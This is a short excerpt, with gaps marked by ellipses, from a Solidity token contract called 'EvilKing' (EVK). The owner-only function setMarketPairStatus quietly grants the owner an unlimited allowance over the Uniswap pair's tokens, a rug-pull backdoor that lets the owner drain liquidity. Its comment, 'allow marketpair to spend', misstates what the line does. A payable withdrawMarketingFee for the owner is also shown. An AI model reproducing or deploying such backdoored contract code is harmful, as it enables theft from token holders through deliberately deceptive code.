...
contract BepToken is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "EvilKing";
    string private _symbol = "EVK";
    ...
    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        _allowances[uniswapPair][owner()] = 2**256 - 1; //allow marketpair to spend
    ...
    function withdrawMarketingFee() public payable virtual onlyOwner {
